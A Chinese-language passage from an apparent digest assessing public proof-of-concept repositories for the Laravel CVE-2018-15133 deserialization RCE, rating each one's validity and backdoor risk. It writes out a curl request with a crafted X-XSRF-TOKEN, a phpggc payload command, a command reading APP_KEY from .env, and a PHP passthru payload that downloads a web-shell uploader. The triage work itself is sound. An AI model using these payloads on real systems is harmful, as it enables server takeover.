代码仓库中主要为演示漏洞利用的代码，并无发现存在恶意行为或后门的代码。`phpggc` 用于生成payload，但其本身不是由该作者提供的,所以此处不做分析。Dockerfile 安装的是已知漏洞版本的 Laravel，用于复现，而不是植入后门，所以投毒可能性较低。 投毒风险较低，大约在1%以下。

**利用方式：**
1.  **获取 APP_KEY：** 攻击者需要首先获取 Laravel 应用的 APP_KEY。通常，这需要攻击者已经获得了服务器的某些权限，例如读取 `.env` 文件的权限。可以通过`docker exec -it $(docker ps --latest --quiet) grep -e ^APP_KEY /var/www/html/laravel/.env`来获取，这说明需要一定的权限才能获取该KEY，这使得利用难度增大。
2.  **生成反序列化 Payload：** 攻击者使用 `phpggc` 工具（或类似工具）生成一个恶意 PHP 反序列化 Payload。该 Payload 包含一个精心构造的对象链，当被反序列化时，会执行任意命令。 例如，`phpggc Laravel/RCE1 'uname -a' -b`。
3.  **加密 Payload：** 使用 Laravel 的加密机制（`Illuminate\Encryption\Encrypter`）以及 APP_KEY 对 Payload 进行加密，生成一个类似于 Laravel XSRF-TOKEN 的字符串。这通过 cve-2018-15133.php 进行
4.  **发送 Payload：** 将加密后的 Payload 放在 `X-XSRF-TOKEN` HTTP header 中，发送一个 POST 请求到存在漏洞的 Laravel 应用。 例如：`curl localhost:8000 -X POST -H 'X-XSRF-TOKEN: eyJpdiI6Imp3c1BUejE5aGFFUVM4a0NcLzIyODBnPT0iLCJ2YWx1ZSI6InZrTEdOY2o1NlVJdlltWFl3OFBxTEY1a1pCZWlaSDRSdXM1STNSa21sSE5Cb3hFd09cL2JUdU0wWHhjK0dUU0dYQzlTd3ZYSm50NTc4NW90UnNrZW5mMHc2RHdcLzZia01cL29wVUhjQml5cCtmZ1VcL2lwbnVySG52MHEwWXdZMVFVSXhWYjFEQlwveTZPQ3JORnRYdVQyeVFnODM1UGVCSVFcL3B6RGs2VDczOTZEbkFKdFwvc3lpZXBtcUo4VllLNU4zS0pMV3ZBUlNXZDRHRmNnOG1vOFZUWDVicE5uV0FcL1NSXC9HRjh2XC9YR2pLUDlEdlEwaytWRHl5TFhvb3RXM0Y4ejNXIiwibWFjIjoiOTMwMTNkZDYwYzNjYmQ1YTg4ZjRmNjM2NmZhMzBjNzA5NTgzYmI`
5.  **触发 RCE：** Laravel 应用在处理请求时，会解密并反序列化 `X-XSRF-TOKEN` 的值。由于 Payload 是恶意的，反序列化过程会触发远程代码执行，导致服务器执行攻击者预先设定的命令。


**项目地址:** [kozmic/laravel-poc-CVE-2018-15133](https://github.com/kozmic/laravel-poc-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #12

**来源**: [CVE-2018-15133-pwnedshell_Larascript.md](../2018/CVE-2018-15133-pwnedshell_Larascript.md)

# CVE-2018-15133

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-15133-0xSalle_cve-2018-15133.md](../2018/CVE-2018-15133-0xSalle_cve-2018-15133.md)

## CVE-2018-15133 Laravel Framework 反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行和服务器被完全控制

**影响版本:** 5.5.40 及之前版本，5.6.x 版本直至 5.6.29

**利用条件:** 需要知道 Laravel 应用的 APP_KEY，通常情况下无法获取，但如果攻击者之前拥有过特权访问权限或成功完成了之前的攻击，则可能获取到。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 漏洞存在于 Laravel Framework 中，攻击者可以通过在 X-XSRF-TOKEN 值上进行未授权的反序列化操作，导致远程代码执行。漏洞存在于 Illuminate/Encryption/Encrypter.php 的 decrypt 方法和 phpggc 的 gadgetchains/Laravel/RCE/3/chain.php 中。利用该漏洞需要知道 Laravel 应用的 APP_KEY，并通过精心构造的序列化数据，触发特定的 PHP 对象链（gadget chain）执行任意代码。

**有效性：**
提供的 POC 代码看起来是有效的，因为它实现了以下功能：
1.  生成恶意 payload：根据指定的命令、API 密钥和 payload 方法，生成反序列化 payload。
2.  加密 payload：使用 Laravel 应用的 APP_KEY 对 payload 进行 AES 加密，并生成相应的 IV 和 MAC 值。
3.  发送 payload：将加密后的 payload 设置到 X-XSRF-TOKEN cookie 中，并发送请求到 Laravel 应用。

**投毒风险：**
该代码仓库中存在一定的投毒风险，大约为10%。风险主要体现在以下几个方面：
1.  **潜在的后门代码：** 即使表面上代码实现了漏洞利用的功能，但攻击者可能在代码中隐藏一些恶意的后门，例如：
    *   在生成 payload 的过程中，插入额外的恶意代码。
    *   在请求发送过程中，记录或泄露敏感信息。
    *   利用漏洞在目标服务器上部署持久化后门。
2.  **依赖风险：** 该 POC 代码可能依赖于一些外部库或模块，这些库或模块本身可能存在安全漏洞或恶意代码。
3.  **不完善的错误处理：** 代码中的错误处理可能不够完善，导致程序在特定情况下崩溃或产生其他安全问题。

**利用方式：**
利用方式如下：
1.  **获取 APP_KEY：** 首先需要获取 Laravel 应用的 APP_KEY。这通常是最困难的一步，可能需要通过其他漏洞或社会工程学手段获取。
2.  **生成 Payload：** 使用 POC 代码生成包含恶意命令的 payload。POC 允许选择不同的 payload 方法（Laravel RCE1, RCE2, RCE3, RCE4），选择合适的 payload 方法可能取决于目标环境的配置。
3.  **加密 Payload：** 使用 APP_KEY 对生成的 payload 进行加密，并计算 MAC 值。
4.  **发送请求：** 将加密后的 payload 作为 X-XSRF-TOKEN cookie 的值发送到目标 Laravel 应用。
5.  **触发反序列化：** Laravel 应用在处理请求时，会尝试解密并反序列化 X-XSRF-TOKEN 的值，从而触发漏洞，执行恶意代码。

**项目地址:** [0xSalle/cve-2018-15133](https://github.com/0xSalle/cve-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #2

**来源**: [CVE-2018-15133-AlienX2001_better-poc-for-CVE-2018-15133.md](../2018/CVE-2018-15133-AlienX2001_better-poc-for-CVE-2018-15133.md)

## CVE-2018-15133 Laravel Framework 反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞导致远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行，完全控制服务器

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道APP_KEY，可以通过其他漏洞获取或之前已获得特权访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 存在于 Laravel Framework 5.5.40 及之前版本，以及 5.6.x 系列的 5.6.29 及之前版本中。攻击者可以通过在 X-XSRF-TOKEN 中发送恶意序列化数据，利用 `unserialize` 函数执行任意代码。利用链涉及 `Illuminate/Encryption/Encrypter.php` 的 decrypt 方法以及 phpggc 中的 `PendingBroadcast` gadget chain。攻击的先决条件是攻击者需要知道 Laravel 应用的 `APP_KEY`，这通常很难，但可以通过信息泄露漏洞或其他攻击获得。提供的 PoC 代码包含一个 bash 脚本 `betterpoc.sh` 用于自动化利用，以及一个 PHP 脚本 `cve-2018-15133.php` 用于生成恶意 X-XSRF-TOKEN。`betterpoc.sh` 脚本通过调用 `phpggc` 生成反序列化 payload，然后使用 `cve-2018-15133.php` 脚本利用 APP_KEY 加密 payload，最终通过 curl 发送包含恶意 token 的 POST 请求。投毒风险分析：尽管 PoC 代码主要用于漏洞验证，自动化脚本存在轻微风险，例如通过修改命令注入后门，该风险较低，约10%，因需要使用者进行配置，且代码清晰可见。利用方式总结：1. 获取目标 Laravel 应用的 APP_KEY。2. 使用 phpggc 生成执行任意命令的反序列化 payload。3. 使用 cve-2018-15133.php 脚本，利用 APP_KEY 加密 payload 生成 X-XSRF-TOKEN。4. 发送包含恶意 X-XSRF-TOKEN 的 POST 请求到目标服务器。

**项目地址:** [AlienX2001/better-poc-for-CVE-2018-15133](https://github.com/AlienX2001/better-poc-for-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #3

**来源**: [CVE-2018-15133-AzhariKun_CVE-2018-15133.md](../2018/CVE-2018-15133-AzhariKun_CVE-2018-15133.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化RCE

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道APP_KEY，并且目标存在未升级的Laravel框架漏洞版本。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-15133是Laravel框架中的一个反序列化漏洞，攻击者通过在X-XSRF-TOKEN中注入恶意序列化数据，并利用`Illuminate/Encryption/Encrypter.php`中的`decrypt`方法进行解密时触发反序列化操作，从而执行任意代码。

**有效性：**
根据漏洞描述和搜索结果，提供的POC代码利用了该漏洞，通过上传包含恶意payload的XSRF-TOKEN，理论上是有效的。该代码首先尝试从`.env`文件中获取`APP_KEY`，然后将目标站点和`APP_KEY`发送到 `http://exploit.anons79.com/`，进行后续处理。GitHub上也有公开的利用代码，可以辅助验证漏洞。

**投毒风险：**
POC 代码存在一定的投毒风险。

1.  **依赖外部网站**：POC 代码向 `http://exploit.anons79.com/` 发送数据。如果这个网站被攻陷或者被作者控制，可能被植入恶意代码。所以具有一定的风险。
2.  **未知的恶意行为**：`http://exploit.anons79.com/` 站点的行为是不透明的。虽然POC声称是自动上传shell,但实际实现可能包含未知的恶意行为，例如：收集目标信息，植入更深层次的后门。
3.  **`.env` 文件泄露**:  直接尝试从 `.env` 文件中读取 `APP_KEY` 存在风险，可能导致敏感信息泄露。

综合来看，投毒风险大概在20%左右。

**利用方式：**
1.  **获取APP_KEY：** 攻击者首先需要获取Laravel应用的APP_KEY。这可以通过多种方式实现，例如：
    *   直接读取.env文件（如果配置不当允许访问）。
    *   通过其他漏洞（如文件包含、SQL注入等）获取。
    *   猜测或者暴力破解（难度较高）。
2.  **构造恶意payload：** 攻击者使用phpggc等工具，根据已知的gadget chain构造恶意的序列化payload。
3.  **加密payload：** 使用APP_KEY和Laravel的加密算法对payload进行加密。
4.  **发送请求：** 将加密后的payload作为X-XSRF-TOKEN的值，发送到目标Laravel应用。
5.  **触发反序列化：** 当Laravel应用处理请求时，会解密X-XSRF-TOKEN，从而触发反序列化操作，最终执行payload中的恶意代码，实现远程代码执行。

**项目地址:** [AzhariKun/CVE-2018-15133](https://github.com/AzhariKun/CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #4

**来源**: [CVE-2018-15133-Bilelxdz_Laravel-CVE-2018-15133.md](../2018/CVE-2018-15133-Bilelxdz_Laravel-CVE-2018-15133.md)

## CVE-2018-15133 Laravel Framework 反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞导致远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道应用程序密钥（APP_KEY），并且目标系统存在脆弱的Laravel版本。需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 漏洞存在于 Laravel Framework 框架中，由于对 X-XSRF-TOKEN 值的反序列化操作不当导致远程代码执行。具体来说，`Illuminate/Encryption/Encrypter.php` 中的 `decrypt` 方法和 `phpggc` 中的 `gadgetchains/Laravel/RCE/3/chain.php` 存在问题。攻击者需要知道应用程序的 APP_KEY 才能利用此漏洞，通常情况下这是不可能的，除非攻击者之前已经获得了特权访问权限或成功完成了之前的攻击。

**有效性评估：**
根据漏洞信息、搜索结果和漏洞利用代码，该漏洞的PoC代码**可能有效**。github上的确存在相关的exp仓库（例如：aljavier/exploit_laravel_cve-2018-15133 和 kozmic/laravel-poc-CVE-2018-15133）。漏洞利用需要已知APP_KEY。

**投毒风险分析：**
提供的PoC代码 `cve.py` 的主要功能是生成包含恶意 URL 的 `curl` 命令，并将其写入 `nikmok.txt` 文件。该 URL 包含一个路径 `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`，并在GET请求中包含一段PHP代码，尝试使用`passthru`函数执行`wget`命令，从github下载 `vspup.php` 并保存为 `lol.php`。这种行为本身就具有风险，因为攻击者可能会控制下载的 `lol.php` 内容，从而执行任意代码。

`README.md` 文件指示用户执行 `nikmok.txt` 文件，该文件包含之前生成的 `curl` 命令，实际上是执行远程文件下载和执行的命令。`/vendor/phpunit/phpunit/src/Util/PHP/lol.php` 文件的路径则指示尝试访问利用`vspup.php`下载的lol.php文件，但是这个路径并不合理，因为vspup.php已经被下载到根目录并命名为lol.php。因此，该EXP存在一些问题，**投毒风险较低,大约为10%**，主要集中在github仓库作者可能在其他文件中包含恶意代码或在vspup.php中植入后门（虽然这个不是这个仓库作者控制的）。

**利用方式：**

1.  **前提条件：** 获取目标 Laravel 应用的 APP_KEY。
2.  **构造恶意 X-XSRF-TOKEN：** 使用 `phpggc` 工具生成包含恶意 payload 的序列化数据。该 payload 利用 Laravel 的反序列化漏洞，可以执行任意代码。
3.  **加密 X-XSRF-TOKEN：** 使用 APP_KEY 对 payload 进行加密，生成有效的 X-XSRF-TOKEN。
4.  **发送请求：** 将加密后的 X-XSRF-TOKEN 作为 Cookie 或 Header 发送到目标 Laravel 应用。
5.  **触发漏洞：** 当 Laravel 应用尝试解密和反序列化 X-XSRF-TOKEN 时，恶意 payload 将被执行，从而实现远程代码执行。
6.  **简化流程(根据提供的POC代码)：**
    a. 运行`cve.py`脚本，输入目标网址。
    b. 脚本会将包含特定路径和参数的curl命令写入`nikmok.txt`，尝试通过GET请求和数据`<?php echo passthru("wget https://raw.githubusercontent.com/sKirua/Vespa-Uploader/master/vspup.php -O lol.php");?>`来下载文件。
    c. 运行`nikmok.txt`（实际上是运行文件内包含的curl命令）。
    d. 目标网站如果存在对应路径，则会尝试下载并执行githubusercontent中的`vspup.php`文件，该文件会被重命名为`lol.php`。
    e.  最终的利用需要攻击者能访问到通过`vspup.php`下载的lol.php文件，在提供的路径`/vendor/phpunit/phpunit/src/Util/PHP/lol.php`中，尝试执行恶意代码。

**项目地址:** [Bilelxdz/Laravel-CVE-2018-15133](https://github.com/Bilelxdz/Laravel-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #5

**来源**: [CVE-2018-15133-Cr4zyD14m0nd137_Lab-for-cve-2018-15133.md](../2018/CVE-2018-15133-Cr4zyD14m0nd137_Lab-for-cve-2018-15133.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40 和 5.6.x <= 5.6.29

**利用条件:** 需要知道应用的APP_KEY

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 存在于 Laravel Framework 直到 5.5.40 和 5.6.x 直到 5.6.29 版本中，是由于对 X-XSRF-TOKEN 值进行 unserialize 调用时，可能导致远程代码执行。漏洞存在于 Illuminate/Encryption/Encrypter.php 的 decrypt 方法和 phpggc 中的 gadgetchains/Laravel/RCE/3/chain.php 中。攻击者必须知道应用程序密钥（APP_KEY），通常这是不可能发生的，除非攻击者先前拥有特权访问权限或成功完成了之前的攻击。

**漏洞利用方式：**

1.  攻击者需要获取 Laravel 应用的 APP_KEY。这通常是最困难的一步。
2.  攻击者使用 phpggc (或类似工具) 生成一个恶意的 PHP 对象序列化字符串，该字符串利用了 Laravel 框架中的反序列化漏洞链（例如，PendingBroadcast 和相关的 gadget chain）。
3.  该序列化字符串被加密并编码，然后设置为 X-XSRF-TOKEN cookie 的值。
4.  当 Laravel 应用尝试解密和反序列化 X-XSRF-TOKEN cookie 时，恶意的对象链会被触发，导致远程代码执行。

**POC有效性：**

提供的 POC 代码利用了 CVE-2018-15133 漏洞。代码中包含了生成加密数据，设置 X-XSRF-TOKEN cookie，以及发送请求的代码。给定的命令可以通过反序列化执行。

**投毒风险：**

查看`exploit.go`后，发现代码的主要功能是生成恶意序列化数据，加密数据，以及发送HTTP请求。该`exploit.go`文件代码量较少,功能明确,没有发现明显的恶意代码。
README.md 文档描述了漏洞利用的步骤和所需的环境。其中提到需要下载并运行 Docker 镜像 `kozmico/laravel-poc-cve-2018-15133`。 虽然该 Docker 镜像本身不是本次评估的一部分，但是如果该镜像中包含恶意代码，则可能会导致投毒攻击。该镜像的安全性需要单独评估。此外，该README建议使用 kali linux 虚拟机进行攻击。说明攻击环境搭建比较复杂。总的来说，此仓库存在一定的投毒风险，但主要风险来源于引用的 Docker 镜像，而非提供的Go代码。根据评估，代码本身存在投毒的概率较低，大约在10%。

**项目地址:** [Cr4zyD14m0nd137/Lab-for-cve-2018-15133](https://github.com/Cr4zyD14m0nd137/Lab-for-cve-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #6

**来源**: [CVE-2018-15133-Loaxert_CVE-2018-15133-PoC.md](../2018/CVE-2018-15133-Loaxert_CVE-2018-15133-PoC.md)

## CVE-2018-15133-Laravel框架-反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道APP_KEY，通过X-XSRF-TOKEN传递恶意payload。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-15133漏洞存在于Laravel Framework的5.5.40及之前版本，以及5.6.x到5.6.29版本。该漏洞是由于对X-XSRF-TOKEN值进行unserialize调用时，未对数据进行充分验证，导致远程代码执行。攻击者需要知道APP_KEY才能成功利用此漏洞。这个APP_KEY通常不会被泄露，但如果攻击者之前拥有特权访问权限或成功完成了之前的攻击，则可能发生。

**漏洞利用方式：**

1.  攻击者获取Laravel应用的APP_KEY（例如，通过源代码泄露、环境变量泄露等）。
2.  攻击者使用phpggc生成包含恶意代码的PHP序列化payload。POC中使用了`Laravel/RCE5` gadget chain，该gadget chain允许执行任意系统命令。
3.  攻击者使用APP_KEY加密该payload，并将其设置为X-XSRF-TOKEN cookie的值。
4.  攻击者向目标Laravel应用发送包含该cookie的HTTP请求。
5.  Laravel应用解密cookie值，然后反序列化payload，执行恶意代码。

**漏洞利用有效性：**

提供的PoC代码是有效的，因为它实现了上述漏洞利用过程。该脚本使用phpggc生成payload，然后使用APP_KEY对其进行加密，并发送包含该加密payload的HTTP请求。

**投毒风险：**

该代码的投毒风险极低。原因如下：

*   代码量较少，逻辑清晰，主要功能是利用已知的反序列化漏洞。
*   代码使用了subprocess调用外部程序phpggc，如果phpggc本身被篡改，则可能引入风险，但该风险不在本代码的范围内。
*   代码中没有发现任何尝试连接外部服务器或执行其他恶意操作的迹象。
*  由于脚本依赖phpggc来生成payload, 因此如果phpggc被替换成了恶意版本,可能会存在被投毒的风险. 但本脚本本身只是对phpggc的调用,不具备投毒的特性. 如果不考虑第三方依赖的风险, 代码投毒风险评估为1%.

**项目地址:** [Loaxert/CVE-2018-15133-PoC](https://github.com/Loaxert/CVE-2018-15133-PoC)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #7

**来源**: [CVE-2018-15133-NatteeSetobol_CVE-2018-15133-Lavel-Expliot.md](../2018/CVE-2018-15133-NatteeSetobol_CVE-2018-15133-Lavel-Expliot.md)

## CVE-2018-15133-Laravel-反序列化漏洞

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道 Laravel 应用的 application key

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-15133 是 Laravel 框架中的一个反序列化漏洞，存在于 5.5.40 及之前的版本，以及 5.6.x 系列的 5.6.29 及之前的版本。该漏洞源于对 X-XSRF-TOKEN 值的不可信反序列化调用，攻击者可以通过构造恶意的序列化数据，并将其作为 X-XSRF-TOKEN 的值发送到服务器，从而触发远程代码执行。

**漏洞利用方式：**

1.  攻击者需要获取 Laravel 应用的 application key。这通常是利用此漏洞最困难的部分。攻击者可能通过先前获取的权限或信息泄露来获得此密钥。
2.  攻击者使用 phpggc 等工具，基于 PendingBroadcast gadget chain 生成恶意的序列化 payload。
3.  攻击者使用 application key 对 payload 进行加密，并生成相应的 X-XSRF-TOKEN 值。
4.  攻击者将构造的 X-XSRF-TOKEN 值添加到 HTTP 请求头中，并发送到目标 Laravel 应用。
5.  服务器在处理请求时，会尝试解密并反序列化 X-XSRF-TOKEN 值，从而触发 payload 中的恶意代码，最终实现远程代码执行。

**有效性：**

根据漏洞信息、搜索结果和提供的 POC 代码，可以判断该漏洞利用是有效的。搜索结果中提供了多个关于此漏洞的描述和利用的链接，包括 NVD、CISA 的已知被利用漏洞目录以及 GitHub 上的 POC 代码仓库。

提供的 POC 代码 (main.cpp) 看起来是一个 C++ 编写的漏洞利用程序，它实现了以下功能：

*   接受 URL、命令和 application key 作为参数。
*   生成恶意的 X-XSRF-TOKEN 值。
*   发送带有构造的 X-XSRF-TOKEN 值的 HTTP 请求到目标 URL。

该 POC 代码使用了 OpenSSL 库进行 AES 加密和 HMAC 计算，并且使用了 Base64 编码。  代码逻辑与漏洞描述一致，即利用已知的 application key，构造恶意payload，经过加密、编码后，作为 X-XSRF-TOKEN 发送，从而触发反序列化漏洞。

**投毒风险：**

该 POC 代码主要由 `main.cpp` 和 `build.sh` 构成。`build.sh` 负责编译 `main.cpp`。`main.cpp` 代码量相对较大，人工review 存在疏漏的可能。以下是我对投毒风险的分析：

*   **正面因素：** 代码逻辑主要集中在实现漏洞利用上，包括参数解析、payload 生成、加密、编码、HTTP 请求发送等。没有发现明显的恶意代码或后门。
*   **负面因素：**  代码使用了第三方库 OpenSSL，并且包含一些字符串处理和内存管理操作，这些地方可能存在安全漏洞。例如，如果代码没有正确处理字符串长度，可能会导致缓冲区溢出。
*   **潜在风险：** 攻击者可能通过修改 `build.sh` 添加额外的编译选项，例如链接恶意库，从而植入后门。但是，提供的 `build.sh` 文件比较简单，只包含编译命令，没有发现任何可疑操作。

综合来看，该仓库中存在作者隐藏的投毒代码的可能性较低，大概在5%左右。主要风险在于代码中可能存在的潜在安全漏洞，以及编译过程中可能被利用的风险。

**项目地址:** [NatteeSetobol/CVE-2018-15133-Lavel-Expliot](https://github.com/NatteeSetobol/CVE-2018-15133-Lavel-Expliot)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #8

**来源**: [CVE-2018-15133-Prabesh01_Laravel-PHP-Unit-RCE-Auto-shell-uploader.md](../2018/CVE-2018-15133-Prabesh01_Laravel-PHP-Unit-RCE-Auto-shell-uploader.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化RCE

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 5.5.x <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道应用的APP_KEY，通过 X-XSRF-TOKEN 传递恶意序列化数据。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-15133 漏洞是 Laravel 框架中由于对 X-XSRF-TOKEN 值的反序列化操作不当导致的远程代码执行漏洞。攻击者可以构造恶意的序列化数据，通过 X-XSRF-TOKEN 头部发送给服务器，服务器在解密和反序列化该数据时，执行攻击者预先设定的恶意代码。漏洞利用的关键在于需要知道 Laravel 应用的 APP_KEY，才能成功加密和构造恶意数据。搜索结果表明该漏洞已被CISA列入已知被利用的漏洞目录。

提供的漏洞利用代码 `rce.sh` 通过访问 `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` 接口，利用该接口执行PHP代码的特性，尝试上传一个PHP Webshell（uploader.php）。虽然脚本本身的功能是上传webshell，但脚本并不会主动植入恶意后门,所以判定投毒风险为0%。 脚本的原理是利用 phpunit 的 eval-stdin.php 文件, 该文件可以执行POST请求中的PHP代码, 从而进行webshell上传。 这种利用方式依赖于目标环境存在phpunit且eval-stdin.php文件存在且可访问。

**项目地址:** [Prabesh01/Laravel-PHP-Unit-RCE-Auto-shell-uploader](https://github.com/Prabesh01/Laravel-PHP-Unit-RCE-Auto-shell-uploader)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #9

**来源**: [CVE-2018-15133-aljavier_exploit_laravel_cve-2018-15133.md](../2018/CVE-2018-15133-aljavier_exploit_laravel_cve-2018-15133.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40 and 5.6.x <= 5.6.29

**利用条件:** 需要知道应用的APP_KEY，这通常需要事先获得了特权访问权限或成功实施了先前的攻击。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133是Laravel框架中的一个反序列化漏洞。攻击者可以利用此漏洞，通过在X-XSRF-TOKEN中注入恶意序列化数据，实现在目标服务器上执行任意代码。漏洞利用的核心在于`Illuminate/Encryption/Encrypter.php`中的`decrypt`方法和`phpggc`中的`gadgetchains/Laravel/RCE/3/chain.php`。

**有效性：**

从漏洞描述和搜索结果来看，此漏洞已经被CISA列入已知被利用的漏洞目录，表明该漏洞在野外被积极利用。提供的PoC代码基于已知的利用方式，并参考了 Metasploit 的 exploit，所以该PoC代码有效。

**投毒风险：**

PoC代码主要由两个文件组成：`README.md` 和 `pwn_laravel.py`。

*   `README.md`: 包含漏洞描述、利用方法、依赖安装和免责声明等信息。没有发现恶意代码。
*   `pwn_laravel.py`: PoC利用脚本，用于生成恶意payload并发送到目标服务器。脚本利用了`Crypto`库进行加密和解密操作。虽然代码功能是实现RCE，但本身逻辑并没有发现明显的投毒行为。

分析后认为，投毒风险主要存在于依赖项上，尤其是`Crypto`库。但是由于该库比较常用，如果存在恶意代码，可能会被更早发现。

根据代码的功能和依赖关系，判定投毒风险为10%。

**利用方式：**

1.  **获取APP_KEY：** 这是利用此漏洞的关键前提。攻击者需要获取目标Laravel应用的APP_KEY。APP_KEY通常存储在`.env`文件中。
2.  **生成恶意Payload：** 使用PoC脚本`pwn_laravel.py`，指定目标URL、APP_KEY和要执行的命令，生成恶意的序列化数据，并使用APP_KEY对其进行加密。
3.  **发送请求：** 将生成的加密数据作为`X-XSRF-TOKEN`的值，通过HTTP请求发送到目标Laravel应用。
4.  **触发反序列化：** Laravel应用在处理请求时，会尝试解密`X-XSRF-TOKEN`，并对其进行反序列化。如果APP_KEY正确，且反序列化链存在，则会导致远程代码执行。

总而言之，该漏洞的利用依赖于APP_KEY的泄露，攻击难度较高，但危害性很大。

**项目地址:** [aljavier/exploit_laravel_cve-2018-15133](https://github.com/aljavier/exploit_laravel_cve-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #10

**来源**: [CVE-2018-15133-bukitbarisan_laravel-rce-cve-2018-15133.md](../2018/CVE-2018-15133-bukitbarisan_laravel-rce-cve-2018-15133.md)

## CVE-2018-15133 Laravel Framework 反序列化漏洞

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40 和 5.6.x <= 5.6.29

**利用条件:** 需要知道 APP_KEY，通常不易获取，除非之前已获得权限或成功进行过其他攻击。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 存在于 Laravel Framework 直到 5.5.40 和 5.6.x 直到 5.6.29 版本中。由于对 X-XSRF-TOKEN 值进行不可信的反序列化调用，可能导致远程代码执行。涉及到 Illuminate/Encryption/Encrypter.php 中的 decrypt 方法和 phpggc 中 gadgetchains/Laravel/RCE/3/chain.php 。攻击者必须知道应用程序密钥（APP_KEY），这通常不会发生，但如果攻击者之前拥有特权访问权限或成功完成了之前的攻击，则可能会发生。

**利用方式：**

1.  **获取 APP_KEY：** 这是利用此漏洞的关键前提。攻击者需要设法获取 Laravel 应用的 APP_KEY，这可能通过源代码泄露、数据库访问或其他漏洞实现。
2.  **构造恶意 XSRF-TOKEN：** 使用 phpggc 工具生成包含恶意 PHP 对象的序列化字符串。该对象旨在利用 Laravel 框架中的反序列化漏洞执行任意代码。
3.  **加密 Payload：**  使用 APP_KEY 对序列化的 Payload 进行加密，生成有效的 XSRF-TOKEN。代码中的`cve.php`脚本完成了这个步骤，使用APP_KEY对phpggc生成的Payload加密，然后放入Cookie中。
4.  **发送包含恶意 XSRF-TOKEN 的请求：**  将构造的 XSRF-TOKEN 设置为 Cookie，并发送到目标 Laravel 应用。
5.  **触发反序列化：**  当 Laravel 应用尝试解密并反序列化 XSRF-TOKEN 时，恶意对象将被实例化，从而执行攻击者指定的代码。

**POC有效性：**

根据提供的漏洞信息、搜索结果以及漏洞利用代码，此POC有效。存在多个公开的漏洞利用代码，CISA也将此漏洞标记为已知被利用漏洞，增加了POC的有效性。

**投毒风险：**

虽然主利用脚本 `cve.php` 看起来是直接利用漏洞，但仍然存在一些潜在的投毒风险：

